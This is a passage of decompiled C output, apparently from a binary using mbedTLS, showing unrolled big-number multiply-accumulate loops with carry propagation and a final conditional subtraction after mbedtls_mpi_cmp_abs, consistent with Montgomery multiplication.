                    v158 = (int32_t)(v154 < v152) + (int32_t)(v152 < v151) + (int32_t)(v150 / 0x100000000) + v157;
                    v159 = (int32_t *)(v130 + 16);
                    v160 = v158 + *v159;
                    *v159 = v160;
                    v161 = *(int32_t *)(v23 + 20);
                    v162 = (int64_t)v26 * (int64_t)v161;
                    v163 = (int32_t)v162;
                    v164 = (int32_t)(v160 < v158) + (int32_t)(v158 < v157) + (int32_t)(v156 / 0x100000000) + v163;
                    v165 = (int32_t *)(v130 + 20);
                    v166 = v164 + *v165;
                    *v165 = v166;
                    v167 = *(int32_t *)(v23 + 24);
                    v168 = (int64_t)v26 * (int64_t)v167;
                    v169 = (int32_t)v168;
                    v170 = (int32_t)(v166 < v164) + (int32_t)(v164 < v163) + (int32_t)(v162 / 0x100000000) + v169;
                    v171 = (int32_t *)(v130 + 24);
                    v172 = v170 + *v171;
                    *v171 = v172;
                    v173 = *(int32_t *)(v23 + 28);
                    g7 = v23 + 32;
                    v174 = (int64_t)v26 * (int64_t)v173;
                    v175 = (int32_t)v174;
                    v176 = (int32_t)(v172 < v170) + (int32_t)(v170 < v169) + (int32_t)(v168 / 0x100000000) + v175;
                    v177 = (int32_t *)(v130 + 28);
                    v178 = v176 + *v177;
                    v179 = (int32_t)(v178 < v176) + (int32_t)(v176 < v175) + (int32_t)(v174 / 0x100000000);
                    *v177 = v178;
                    v180 = v130 + 32;
                    g5 = v180;
                    v181 = g7;
                    // continue -> 0x8056a80
                }
                // 0x8056b27
                v128 = v22 + 32 + 32 * (v25 - 8) / 8;
                v23 = v181;
                v24 = v179;
                v129 = v25 % 8;
                // branch -> 0x8056b2b
            }
            int32_t v182 = v128;
            if (v129 != 0) {
                int32_t v183 = v129; // 0x8056b38
                int32_t v184 = v128;
                g7 = v23 + 4;
                uint64_t v185 = (int64_t)*(int32_t *)v23 * v21; // 0x8056b48
                uint32_t v186 = (int32_t)v185; // 0x8056b48
                uint32_t v187 = v186 + v24; // 0x8056b4a
                int32_t * v188 = (int32_t *)v184; // 0x8056b4f_0
                uint32_t v189 = v187 + *v188; // 0x8056b4f
                int32_t v190 = (int32_t)(v189 < v187) + (int32_t)(v187 < v186) + (int32_t)(v185 / 0x100000000); // 0x8056b51
                *v188 = v189;
                int32_t v191 = v184 + 4; // 0x8056b56
                g5 = v191;
                // branch -> 0x8056b38
                while (v183 != 1) {
                    // 0x8056b38
                    v183--;
                    v184 = v191;
                    v23 = g7;
                    g7 = v23 + 4;
                    v185 = (int64_t)*(int32_t *)v23 * v21;
                    v186 = (int32_t)v185;
                    v187 = v186 + v190;
                    v188 = (int32_t *)v184;
                    v189 = v187 + *v188;
                    v190 = (int32_t)(v189 < v187) + (int32_t)(v187 < v186) + (int32_t)(v185 / 0x100000000);
                    *v188 = v189;
                    v191 = v184 + 4;
                    g5 = v191;
                    // continue -> 0x8056b38
                }
                // 0x8056b68
                v182 = v128 + 4 * v129;
                v24 = v190;
                // branch -> 0x8056b68
            }
            int32_t * v192 = (int32_t *)v182; // 0x8056b78_0
            int32_t v193 = *v192 + v24; // 0x8056b78
            *v192 = v193;
            // branch -> 0x8056b78
            while (v193 < v24) {
                // 0x8056b78
                v182 += 4;
                v24 = v193 < v24;
                v192 = (int32_t *)v182;
                v193 = *v192 + v24;
                *v192 = v193;
                // continue -> 0x8056b78
            }
            int64_t v194 = a1 * (int64_t)(*v20 + *(int32_t *)v12 * v19); // 0x8056b9f
            int32_t v195 = v194; // 0x8056b9f
            int32_t v196 = v17;
            int32_t v197 = 0; // 0x8056e1a274
            int32_t v198 = v5;
            if (v5 >= 16) {
                int32_t v199 = v17;
                int32_t v200 = v5 - 16; // 0x8056bd0
                v26 = v195;
                uint64_t v201 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff); // 0x8056be3
                uint32_t v202 = (int32_t)v201; // 0x8056be3
                uint32_t v203 = v202; // 0x8056be5
                int32_t * v204 = (int32_t *)v199; // 0x8056bea_0
                uint32_t v205 = v203 + *v204; // 0x8056bea
                *v204 = v205;
                uint32_t v206 = *(int32_t *)(v16 + 4); // 0x8056bf2
                uint64_t v207 = (int64_t)v26 * (int64_t)v206; // 0x8056bf3
                uint32_t v208 = (int32_t)v207; // 0x8056bf3
                uint32_t v209 = (int32_t)(v205 < v203) + (int32_t)(v203 < v202) + (int32_t)(v201 / 0x100000000) + v208; // 0x8056bf5
                int32_t * v210 = (int32_t *)(v199 + 4); // 0x8056bfa_0
                uint32_t v211 = v209 + *v210; // 0x8056bfa
                *v210 = v211;
                uint32_t v212 = *(int32_t *)(v16 + 8); // 0x8056c02
                uint64_t v213 = (int64_t)v26 * (int64_t)v212; // 0x8056c03
                uint32_t v214 = (int32_t)v213; // 0x8056c03
                uint32_t v215 = (int32_t)(v211 < v209) + (int32_t)(v209 < v208) + (int32_t)(v207 / 0x100000000) + v214; // 0x8056c05
                int32_t * v216 = (int32_t *)(v199 + 8); // 0x8056c0a_0
                uint32_t v217 = v215 + *v216; // 0x8056c0a
                *v216 = v217;
                uint32_t v218 = *(int32_t *)(v16 + 12); // 0x8056c12
                uint64_t v219 = (int64_t)v26 * (int64_t)v218; // 0x8056c13
                uint32_t v220 = (int32_t)v219; // 0x8056c13
                uint32_t v221 = (int32_t)(v217 < v215) + (int32_t)(v215 < v214) + (int32_t)(v213 / 0x100000000) + v220; // 0x8056c15
                int32_t * v222 = (int32_t *)(v199 + 12); // 0x8056c1a_0
                uint32_t v223 = v221 + *v222; // 0x8056c1a
                *v222 = v223;
                uint32_t v224 = *(int32_t *)(v16 + 16); // 0x8056c22
                uint64_t v225 = (int64_t)v26 * (int64_t)v224; // 0x8056c23
                uint32_t v226 = (int32_t)v225; // 0x8056c23
                uint32_t v227 = (int32_t)(v223 < v221) + (int32_t)(v221 < v220) + (int32_t)(v219 / 0x100000000) + v226; // 0x8056c25
                int32_t * v228 = (int32_t *)(v199 + 16); // 0x8056c2a_0
                uint32_t v229 = v227 + *v228; // 0x8056c2a
                *v228 = v229;
                uint32_t v230 = *(int32_t *)(v16 + 20); // 0x8056c32
                uint64_t v231 = (int64_t)v26 * (int64_t)v230; // 0x8056c33
                uint32_t v232 = (int32_t)v231; // 0x8056c33
                uint32_t v233 = (int32_t)(v229 < v227) + (int32_t)(v227 < v226) + (int32_t)(v225 / 0x100000000) + v232; // 0x8056c35
                int32_t * v234 = (int32_t *)(v199 + 20); // 0x8056c3a_0
                uint32_t v235 = v233 + *v234; // 0x8056c3a
                *v234 = v235;
                uint32_t v236 = *(int32_t *)(v16 + 24); // 0x8056c42
                uint64_t v237 = (int64_t)v26 * (int64_t)v236; // 0x8056c43
                uint32_t v238 = (int32_t)v237; // 0x8056c43
                uint32_t v239 = (int32_t)(v235 < v233) + (int32_t)(v233 < v232) + (int32_t)(v231 / 0x100000000) + v238; // 0x8056c45
                int32_t * v240 = (int32_t *)(v199 + 24); // 0x8056c4a_0
                uint32_t v241 = v239 + *v240; // 0x8056c4a
                *v240 = v241;
                uint32_t v242 = *(int32_t *)(v16 + 28); // 0x8056c52
                uint64_t v243 = (int64_t)v26 * (int64_t)v242; // 0x8056c53
                uint32_t v244 = (int32_t)v243; // 0x8056c53
                uint32_t v245 = (int32_t)(v241 < v239) + (int32_t)(v239 < v238) + (int32_t)(v237 / 0x100000000) + v244; // 0x8056c55
                int32_t * v246 = (int32_t *)(v199 + 28); // 0x8056c5a_0
                uint32_t v247 = v245 + *v246; // 0x8056c5a
                *v246 = v247;
                uint32_t v248 = *(int32_t *)(v16 + 32); // 0x8056c62
                uint64_t v249 = (int64_t)v26 * (int64_t)v248; // 0x8056c63
                uint32_t v250 = (int32_t)v249; // 0x8056c63
                uint32_t v251 = (int32_t)(v247 < v245) + (int32_t)(v245 < v244) + (int32_t)(v243 / 0x100000000) + v250; // 0x8056c65
                int32_t * v252 = (int32_t *)(v199 + 32); // 0x8056c6a_0
                uint32_t v253 = v251 + *v252; // 0x8056c6a
                *v252 = v253;
                uint32_t v254 = *(int32_t *)(v16 + 36); // 0x8056c72
                uint64_t v255 = (int64_t)v26 * (int64_t)v254; // 0x8056c73
                uint32_t v256 = (int32_t)v255; // 0x8056c73
                uint32_t v257 = (int32_t)(v253 < v251) + (int32_t)(v251 < v250) + (int32_t)(v249 / 0x100000000) + v256; // 0x8056c75
                int32_t * v258 = (int32_t *)(v199 + 36); // 0x8056c7a_0
                uint32_t v259 = v257 + *v258; // 0x8056c7a
                *v258 = v259;
                uint32_t v260 = *(int32_t *)(v16 + 40); // 0x8056c82
                uint64_t v261 = (int64_t)v26 * (int64_t)v260; // 0x8056c83
                uint32_t v262 = (int32_t)v261; // 0x8056c83
                uint32_t v263 = (int32_t)(v259 < v257) + (int32_t)(v257 < v256) + (int32_t)(v255 / 0x100000000) + v262; // 0x8056c85
                int32_t * v264 = (int32_t *)(v199 + 40); // 0x8056c8a_0
                uint32_t v265 = v263 + *v264; // 0x8056c8a
                *v264 = v265;
                uint32_t v266 = *(int32_t *)(v16 + 44); // 0x8056c92
                uint64_t v267 = (int64_t)v26 * (int64_t)v266; // 0x8056c93
                uint32_t v268 = (int32_t)v267; // 0x8056c93
                uint32_t v269 = (int32_t)(v265 < v263) + (int32_t)(v263 < v262) + (int32_t)(v261 / 0x100000000) + v268; // 0x8056c95
                int32_t * v270 = (int32_t *)(v199 + 44); // 0x8056c9a_0
                uint32_t v271 = v269 + *v270; // 0x8056c9a
                *v270 = v271;
                uint32_t v272 = *(int32_t *)(v16 + 48); // 0x8056ca2
                uint64_t v273 = (int64_t)v26 * (int64_t)v272; // 0x8056ca3
                uint32_t v274 = (int32_t)v273; // 0x8056ca3
                uint32_t v275 = (int32_t)(v271 < v269) + (int32_t)(v269 < v268) + (int32_t)(v267 / 0x100000000) + v274; // 0x8056ca5
                int32_t * v276 = (int32_t *)(v199 + 48); // 0x8056caa_0
                uint32_t v277 = v275 + *v276; // 0x8056caa
                *v276 = v277;
                uint32_t v278 = *(int32_t *)(v16 + 52); // 0x8056cb2
                uint64_t v279 = (int64_t)v26 * (int64_t)v278; // 0x8056cb3
                uint32_t v280 = (int32_t)v279; // 0x8056cb3
                uint32_t v281 = (int32_t)(v277 < v275) + (int32_t)(v275 < v274) + (int32_t)(v273 / 0x100000000) + v280; // 0x8056cb5
                int32_t * v282 = (int32_t *)(v199 + 52); // 0x8056cba_0
                uint32_t v283 = v281 + *v282; // 0x8056cba
                *v282 = v283;
                uint32_t v284 = *(int32_t *)(v16 + 56); // 0x8056cc2
                uint64_t v285 = (int64_t)v26 * (int64_t)v284; // 0x8056cc3
                uint32_t v286 = (int32_t)v285; // 0x8056cc3
                uint32_t v287 = (int32_t)(v283 < v281) + (int32_t)(v281 < v280) + (int32_t)(v279 / 0x100000000) + v286; // 0x8056cc5
                int32_t * v288 = (int32_t *)(v199 + 56); // 0x8056cca_0
                uint32_t v289 = v287 + *v288; // 0x8056cca
                *v288 = v289;
                uint32_t v290 = *(int32_t *)(v16 + 60); // 0x8056cd2
                g7 = v16 + 64;
                uint64_t v291 = (int64_t)v26 * (int64_t)v290; // 0x8056cd3
                uint32_t v292 = (int32_t)v291; // 0x8056cd3
                uint32_t v293 = (int32_t)(v289 < v287) + (int32_t)(v287 < v286) + (int32_t)(v285 / 0x100000000) + v292; // 0x8056cd5
                int32_t * v294 = (int32_t *)(v199 + 60); // 0x8056cda_0
                uint32_t v295 = v293 + *v294; // 0x8056cda
                int32_t v296 = (int32_t)(v295 < v293) + (int32_t)(v293 < v292) + (int32_t)(v291 / 0x100000000); // 0x8056cdc
                *v294 = v295;
                int32_t v297 = v199 + 64; // 0x8056ce1
                g5 = v297;
                int32_t v298 = g7; // 0x8056ceb
                // branch -> 0x8056bd0
                while (v200 > 15) {
                    // 0x8056bd0
                    v16 = v298;
                    v199 = v297;
                    v200 -= 16;
                    v26 = v195;
                    v201 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff);
                    v202 = (int32_t)v201;
                    v203 = v202 + v296;
                    v204 = (int32_t *)v199;
                    v205 = v203 + *v204;
                    *v204 = v205;
                    v206 = *(int32_t *)(v16 + 4);
                    v207 = (int64_t)v26 * (int64_t)v206;
                    v208 = (int32_t)v207;
                    v209 = (int32_t)(v205 < v203) + (int32_t)(v203 < v202) + (int32_t)(v201 / 0x100000000) + v208;
                    v210 = (int32_t *)(v199 + 4);
                    v211 = v209 + *v210;
                    *v210 = v211;
                    v212 = *(int32_t *)(v16 + 8);
                    v213 = (int64_t)v26 * (int64_t)v212;
                    v214 = (int32_t)v213;
                    v215 = (int32_t)(v211 < v209) + (int32_t)(v209 < v208) + (int32_t)(v207 / 0x100000000) + v214;
                    v216 = (int32_t *)(v199 + 8);
                    v217 = v215 + *v216;
                    *v216 = v217;
                    v218 = *(int32_t *)(v16 + 12);
                    v219 = (int64_t)v26 * (int64_t)v218;
                    v220 = (int32_t)v219;
                    v221 = (int32_t)(v217 < v215) + (int32_t)(v215 < v214) + (int32_t)(v213 / 0x100000000) + v220;
                    v222 = (int32_t *)(v199 + 12);
                    v223 = v221 + *v222;
                    *v222 = v223;
                    v224 = *(int32_t *)(v16 + 16);
                    v225 = (int64_t)v26 * (int64_t)v224;
                    v226 = (int32_t)v225;
                    v227 = (int32_t)(v223 < v221) + (int32_t)(v221 < v220) + (int32_t)(v219 / 0x100000000) + v226;
                    v228 = (int32_t *)(v199 + 16);
                    v229 = v227 + *v228;
                    *v228 = v229;
                    v230 = *(int32_t *)(v16 + 20);
                    v231 = (int64_t)v26 * (int64_t)v230;
                    v232 = (int32_t)v231;
                    v233 = (int32_t)(v229 < v227) + (int32_t)(v227 < v226) + (int32_t)(v225 / 0x100000000) + v232;
                    v234 = (int32_t *)(v199 + 20);
                    v235 = v233 + *v234;
                    *v234 = v235;
                    v236 = *(int32_t *)(v16 + 24);
                    v237 = (int64_t)v26 * (int64_t)v236;
                    v238 = (int32_t)v237;
                    v239 = (int32_t)(v235 < v233) + (int32_t)(v233 < v232) + (int32_t)(v231 / 0x100000000) + v238;
                    v240 = (int32_t *)(v199 + 24);
                    v241 = v239 + *v240;
                    *v240 = v241;
                    v242 = *(int32_t *)(v16 + 28);
                    v243 = (int64_t)v26 * (int64_t)v242;
                    v244 = (int32_t)v243;
                    v245 = (int32_t)(v241 < v239) + (int32_t)(v239 < v238) + (int32_t)(v237 / 0x100000000) + v244;
                    v246 = (int32_t *)(v199 + 28);
                    v247 = v245 + *v246;
                    *v246 = v247;
                    v248 = *(int32_t *)(v16 + 32);
                    v249 = (int64_t)v26 * (int64_t)v248;
                    v250 = (int32_t)v249;
                    v251 = (int32_t)(v247 < v245) + (int32_t)(v245 < v244) + (int32_t)(v243 / 0x100000000) + v250;
                    v252 = (int32_t *)(v199 + 32);
                    v253 = v251 + *v252;
                    *v252 = v253;
                    v254 = *(int32_t *)(v16 + 36);
                    v255 = (int64_t)v26 * (int64_t)v254;
                    v256 = (int32_t)v255;
                    v257 = (int32_t)(v253 < v251) + (int32_t)(v251 < v250) + (int32_t)(v249 / 0x100000000) + v256;
                    v258 = (int32_t *)(v199 + 36);
                    v259 = v257 + *v258;
                    *v258 = v259;
                    v260 = *(int32_t *)(v16 + 40);
                    v261 = (int64_t)v26 * (int64_t)v260;
                    v262 = (int32_t)v261;
                    v263 = (int32_t)(v259 < v257) + (int32_t)(v257 < v256) + (int32_t)(v255 / 0x100000000) + v262;
                    v264 = (int32_t *)(v199 + 40);
                    v265 = v263 + *v264;
                    *v264 = v265;
                    v266 = *(int32_t *)(v16 + 44);
                    v267 = (int64_t)v26 * (int64_t)v266;
                    v268 = (int32_t)v267;
                    v269 = (int32_t)(v265 < v263) + (int32_t)(v263 < v262) + (int32_t)(v261 / 0x100000000) + v268;
                    v270 = (int32_t *)(v199 + 44);
                    v271 = v269 + *v270;
                    *v270 = v271;
                    v272 = *(int32_t *)(v16 + 48);
                    v273 = (int64_t)v26 * (int64_t)v272;
                    v274 = (int32_t)v273;
                    v275 = (int32_t)(v271 < v269) + (int32_t)(v269 < v268) + (int32_t)(v267 / 0x100000000) + v274;
                    v276 = (int32_t *)(v199 + 48);
                    v277 = v275 + *v276;
                    *v276 = v277;
                    v278 = *(int32_t *)(v16 + 52);
                    v279 = (int64_t)v26 * (int64_t)v278;
                    v280 = (int32_t)v279;
                    v281 = (int32_t)(v277 < v275) + (int32_t)(v275 < v274) + (int32_t)(v273 / 0x100000000) + v280;
                    v282 = (int32_t *)(v199 + 52);
                    v283 = v281 + *v282;
                    *v282 = v283;
                    v284 = *(int32_t *)(v16 + 56);
                    v285 = (int64_t)v26 * (int64_t)v284;
                    v286 = (int32_t)v285;
                    v287 = (int32_t)(v283 < v281) + (int32_t)(v281 < v280) + (int32_t)(v279 / 0x100000000) + v286;
                    v288 = (int32_t *)(v199 + 56);
                    v289 = v287 + *v288;
                    *v288 = v289;
                    v290 = *(int32_t *)(v16 + 60);
                    g7 = v16 + 64;
                    v291 = (int64_t)v26 * (int64_t)v290;
                    v292 = (int32_t)v291;
                    v293 = (int32_t)(v289 < v287) + (int32_t)(v287 < v286) + (int32_t)(v285 / 0x100000000) + v292;
                    v294 = (int32_t *)(v199 + 60);
                    v295 = v293 + *v294;
                    v296 = (int32_t)(v295 < v293) + (int32_t)(v293 < v292) + (int32_t)(v291 / 0x100000000);
                    *v294 = v295;
                    v297 = v199 + 64;
                    g5 = v297;
                    v298 = g7;
                    // continue -> 0x8056bd0
                }
                // 0x8056cf7
                v16 = v298;
                v196 = 64 * (v5 - 16) / 16 + 64 + v17;
                v197 = v296;
                v198 = v5 % 16;
                // branch -> 0x8056cfd
            }
            int32_t v299 = v196;
            int32_t v300 = v198;
            if (v198 >= 8) {
                int32_t v301 = v196;
                int32_t v302 = v198 - 8; // 0x8056d10
                v26 = v195;
                uint64_t v303 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff); // 0x8056d23
                uint32_t v304 = (int32_t)v303; // 0x8056d23
                uint32_t v305 = v304 + v197; // 0x8056d25
                int32_t * v306 = (int32_t *)v301; // 0x8056d2a_0
                uint32_t v307 = v305 + *v306; // 0x8056d2a
                *v306 = v307;
                int32_t v308 = *(int32_t *)(v16 + 4); // 0x8056d32
                uint64_t v309 = (int64_t)v26 * (int64_t)v308; // 0x8056d33
                uint32_t v310 = (int32_t)v309; // 0x8056d33
                uint32_t v311 = (int32_t)(v307 < v305) + (int32_t)(v305 < v304) + (int32_t)(v303 / 0x100000000) + v310; // 0x8056d35
                int32_t * v312 = (int32_t *)(v301 + 4); // 0x8056d3a_0
                uint32_t v313 = v311 + *v312; // 0x8056d3a
                *v312 = v313;
                int32_t v314 = *(int32_t *)(v16 + 8); // 0x8056d42
                uint64_t v315 = (int64_t)v26 * (int64_t)v314; // 0x8056d43
                uint32_t v316 = (int32_t)v315; // 0x8056d43
                uint32_t v317 = (int32_t)(v313 < v311) + (int32_t)(v311 < v310) + (int32_t)(v309 / 0x100000000) + v316; // 0x8056d45
                int32_t * v318 = (int32_t *)(v301 + 8); // 0x8056d4a_0
                uint32_t v319 = v317 + *v318; // 0x8056d4a
                *v318 = v319;
                int32_t v320 = *(int32_t *)(v16 + 12); // 0x8056d52
                uint64_t v321 = (int64_t)v26 * (int64_t)v320; // 0x8056d53
                uint32_t v322 = (int32_t)v321; // 0x8056d53
                uint32_t v323 = (int32_t)(v319 < v317) + (int32_t)(v317 < v316) + (int32_t)(v315 / 0x100000000) + v322; // 0x8056d55
                int32_t * v324 = (int32_t *)(v301 + 12); // 0x8056d5a_0
                uint32_t v325 = v323 + *v324; // 0x8056d5a
                *v324 = v325;
                int32_t v326 = *(int32_t *)(v16 + 16); // 0x8056d62
                uint64_t v327 = (int64_t)v26 * (int64_t)v326; // 0x8056d63
                uint32_t v328 = (int32_t)v327; // 0x8056d63
                uint32_t v329 = (int32_t)(v325 < v323) + (int32_t)(v323 < v322) + (int32_t)(v321 / 0x100000000) + v328; // 0x8056d65
                int32_t * v330 = (int32_t *)(v301 + 16); // 0x8056d6a_0
                uint32_t v331 = v329 + *v330; // 0x8056d6a
                *v330 = v331;
                int32_t v332 = *(int32_t *)(v16 + 20); // 0x8056d72
                uint64_t v333 = (int64_t)v26 * (int64_t)v332; // 0x8056d73
                uint32_t v334 = (int32_t)v333; // 0x8056d73
                uint32_t v335 = (int32_t)(v331 < v329) + (int32_t)(v329 < v328) + (int32_t)(v327 / 0x100000000) + v334; // 0x8056d75
                int32_t * v336 = (int32_t *)(v301 + 20); // 0x8056d7a_0
                uint32_t v337 = v335 + *v336; // 0x8056d7a
                *v336 = v337;
                int32_t v338 = *(int32_t *)(v16 + 24); // 0x8056d82
                uint64_t v339 = (int64_t)v26 * (int64_t)v338; // 0x8056d83
                uint32_t v340 = (int32_t)v339; // 0x8056d83
                uint32_t v341 = (int32_t)(v337 < v335) + (int32_t)(v335 < v334) + (int32_t)(v333 / 0x100000000) + v340; // 0x8056d85
                int32_t * v342 = (int32_t *)(v301 + 24); // 0x8056d8a_0
                uint32_t v343 = v341 + *v342; // 0x8056d8a
                *v342 = v343;
                int32_t v344 = *(int32_t *)(v16 + 28); // 0x8056d92
                g7 = v16 + 32;
                uint64_t v345 = (int64_t)v26 * (int64_t)v344; // 0x8056d93
                uint32_t v346 = (int32_t)v345; // 0x8056d93
                uint32_t v347 = (int32_t)(v343 < v341) + (int32_t)(v341 < v340) + (int32_t)(v339 / 0x100000000) + v346; // 0x8056d95
                int32_t * v348 = (int32_t *)(v301 + 28); // 0x8056d9a_0
                uint32_t v349 = v347 + *v348; // 0x8056d9a
                int32_t v350 = (int32_t)(v349 < v347) + (int32_t)(v347 < v346) + (int32_t)(v345 / 0x100000000); // 0x8056d9c
                *v348 = v349;
                int32_t v351 = v301 + 32; // 0x8056da1
                g5 = v351;
                int32_t v352 = g7; // 0x8056dab
                // branch -> 0x8056d10
                while (v302 > 7) {
                    // 0x8056d10
                    v16 = v352;
                    v301 = v351;
                    v302 -= 8;
                    v26 = v195;
                    v303 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff);
                    v304 = (int32_t)v303;
                    v305 = v304 + v350;
                    v306 = (int32_t *)v301;
                    v307 = v305 + *v306;
                    *v306 = v307;
                    v308 = *(int32_t *)(v16 + 4);
                    v309 = (int64_t)v26 * (int64_t)v308;
                    v310 = (int32_t)v309;
                    v311 = (int32_t)(v307 < v305) + (int32_t)(v305 < v304) + (int32_t)(v303 / 0x100000000) + v310;
                    v312 = (int32_t *)(v301 + 4);
                    v313 = v311 + *v312;
                    *v312 = v313;
                    v314 = *(int32_t *)(v16 + 8);
                    v315 = (int64_t)v26 * (int64_t)v314;
                    v316 = (int32_t)v315;
                    v317 = (int32_t)(v313 < v311) + (int32_t)(v311 < v310) + (int32_t)(v309 / 0x100000000) + v316;
                    v318 = (int32_t *)(v301 + 8);
                    v319 = v317 + *v318;
                    *v318 = v319;
                    v320 = *(int32_t *)(v16 + 12);
                    v321 = (int64_t)v26 * (int64_t)v320;
                    v322 = (int32_t)v321;
                    v323 = (int32_t)(v319 < v317) + (int32_t)(v317 < v316) + (int32_t)(v315 / 0x100000000) + v322;
                    v324 = (int32_t *)(v301 + 12);
                    v325 = v323 + *v324;
                    *v324 = v325;
                    v326 = *(int32_t *)(v16 + 16);
                    v327 = (int64_t)v26 * (int64_t)v326;
                    v328 = (int32_t)v327;
                    v329 = (int32_t)(v325 < v323) + (int32_t)(v323 < v322) + (int32_t)(v321 / 0x100000000) + v328;
                    v330 = (int32_t *)(v301 + 16);
                    v331 = v329 + *v330;
                    *v330 = v331;
                    v332 = *(int32_t *)(v16 + 20);
                    v333 = (int64_t)v26 * (int64_t)v332;
                    v334 = (int32_t)v333;
                    v335 = (int32_t)(v331 < v329) + (int32_t)(v329 < v328) + (int32_t)(v327 / 0x100000000) + v334;
                    v336 = (int32_t *)(v301 + 20);
                    v337 = v335 + *v336;
                    *v336 = v337;
                    v338 = *(int32_t *)(v16 + 24);
                    v339 = (int64_t)v26 * (int64_t)v338;
                    v340 = (int32_t)v339;
                    v341 = (int32_t)(v337 < v335) + (int32_t)(v335 < v334) + (int32_t)(v333 / 0x100000000) + v340;
                    v342 = (int32_t *)(v301 + 24);
                    v343 = v341 + *v342;
                    *v342 = v343;
                    v344 = *(int32_t *)(v16 + 28);
                    g7 = v16 + 32;
                    v345 = (int64_t)v26 * (int64_t)v344;
                    v346 = (int32_t)v345;
                    v347 = (int32_t)(v343 < v341) + (int32_t)(v341 < v340) + (int32_t)(v339 / 0x100000000) + v346;
                    v348 = (int32_t *)(v301 + 28);
                    v349 = v347 + *v348;
                    v350 = (int32_t)(v349 < v347) + (int32_t)(v347 < v346) + (int32_t)(v345 / 0x100000000);
                    *v348 = v349;
                    v351 = v301 + 32;
                    g5 = v351;
                    v352 = g7;
                    // continue -> 0x8056d10
                }
                // 0x8056db7
                v16 = v352;
                v299 = v196 + 32 + 32 * (v198 - 8) / 8;
                v197 = v350;
                v300 = v198 % 8;
                // branch -> 0x8056dbb
            }
            int32_t v353 = v299;
            if (v300 != 0) {
                int32_t v354 = v300; // 0x8056dc8
                int32_t v355 = v299;
                g7 = v16 + 4;
                uint64_t v356 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff); // 0x8056dd8
                uint32_t v357 = (int32_t)v356; // 0x8056dd8
                uint32_t v358 = v357 + v197; // 0x8056dda
                int32_t * v359 = (int32_t *)v355; // 0x8056ddf_0
                uint32_t v360 = v358 + *v359; // 0x8056ddf
                int32_t v361 = (int32_t)(v360 < v358) + (int32_t)(v358 < v357) + (int32_t)(v356 / 0x100000000); // 0x8056de1
                *v359 = v360;
                int32_t v362 = v355 + 4; // 0x8056de6
                g5 = v362;
                // branch -> 0x8056dc8
                while (v354 != 1) {
                    // 0x8056dc8
                    v354--;
                    v16 = g7;
                    v355 = v362;
                    g7 = v16 + 4;
                    v356 = (int64_t)*(int32_t *)v16 * (v194 & 0xffffffff);
                    v357 = (int32_t)v356;
                    v358 = v357 + v361;
                    v359 = (int32_t *)v355;
                    v360 = v358 + *v359;
                    v361 = (int32_t)(v360 < v358) + (int32_t)(v358 < v357) + (int32_t)(v356 / 0x100000000);
                    *v359 = v360;
                    v362 = v355 + 4;
                    g5 = v362;
                    // continue -> 0x8056dc8
                }
                // 0x8056df8
                v353 = v299 + 4 * v300;
                v197 = v361;
                // branch -> 0x8056df8
            }
            int32_t * v363 = (int32_t *)v353; // 0x8056e08_0
            int32_t v364 = *v363 + v197; // 0x8056e08
            *v363 = v364;
            // branch -> 0x8056e08
            while (v364 < v197) {
                // 0x8056e08
                v353 += 4;
                v197 = v364 < v197;
                v363 = (int32_t *)v353;
                v364 = *v363 + v197;
                *v363 = v364;
                // continue -> 0x8056e08
            }
            int32_t v365 = v18 + 1; // 0x8056e28
            *v20 = v19;
            int32_t v366 = v17 + 4; // 0x8056e34
            *(int32_t *)(v366 + v15) = 0;
            if (v5 <= v365) {
                // break -> 0x8056e4a
                break;
            }
            v17 = v366;
            v18 = v365;
            // continue -> 0x80568f0
        }
        // 0x8056e4a
        v11 = v15;
        v9 = v13;
        v10 = v6 + v14;
        // branch -> 0x8056e56
    }
    // 0x8056e56
    g3 = v10;
    memcpy((char *)v9, (char *)v10, v11);
    int32_t v367; // eax
    int32_t v368; // ecx
    int32_t v369;
    if (mbedtls_mpi_cmp_abs(g1, result8) < 0) {
        int32_t v370 = *v4; // 0x8056f1c
        v368 = v370;
        if (v5 != 0) {
            // 0x8056f24
            v367 = 0;
            int32_t v371 = 0; // 0x8056f46
            int32_t v372 = v370; // 0x8056f46
            int32_t v373 = *(int32_t *)v370; // 0x8056f39
            int32_t v374 = 0;
            // branch -> 0x8056f33
            while (true) {
                int32_t v375 = v373 - v374; // 0x8056f39
                *(int32_t *)(4 * v371 + v372) = v375;
                int32_t v376 = 4 * v367; // 0x8056f49
                int32_t * v377 = (int32_t *)(v376 + *(int32_t *)(g1 + 8)); // 0x8056f49_0
                uint32_t v378 = *v377; // 0x8056f49
                int32_t v379 = (int32_t)(v375 < v378) + (int32_t)(v373 < v374); // 0x8056f52
                *(int32_t *)(v368 + v376) = v375 - *v377;
                int32_t v380 = v367 + 1; // 0x8056f5a
                v367 = v380;
                if (v5 <= v380) {
                    int32_t result = v368 + 4 * v5; // 0x8056f6a
                    if (v379 == 0) {
                        // 0x8056f06
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v369;
                        return result;
                    }
                    int32_t * v381 = (int32_t *)result; // 0x0382
                    uint32_t v382 = *v381; // 0x8056f7a383
                    *v381 = v382 - v379;
                    int32_t result2 = result + 4; // 0x8056f87388
                    int32_t v383 = v382 < v379; // 0x8056f8a389
                    if (v383 == 0) {
                        // 0x8056f8e
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v369;
                        return result2;
                    }
                    int32_t * v384 = (int32_t *)result2; // 0x8056f7a_0
                    uint32_t v385 = *v384; // 0x8056f7a
                    *v384 = v385 - v383;
                    int32_t result3 = result2 + 4; // 0x8056f87
                    while ((int32_t)(v385 < v383) != 0) {
                        // 0x8056f78
                        v383 = v385 < v383;
                        v384 = (int32_t *)result3;
                        v385 = *v384;
                        *v384 = v385 - v383;
                        result3 += 4;
                        // continue -> 0x8056f78
                    }
                    // 0x8056f8e
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v369;
                    return result3;
                }
                // 0x8056f30
                v371 = v380;
                v372 = v368;
                v373 = *(int32_t *)(v368 + 4 * v380);
                v374 = v379;
                // branch -> 0x8056f33
            }
        }
        // 0x8056f06
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v369;
        return result4;
    }
    int32_t v386 = *(int32_t *)(g1 + 8); // 0x8056e94
    v368 = v386;
    if (v5 != 0) {
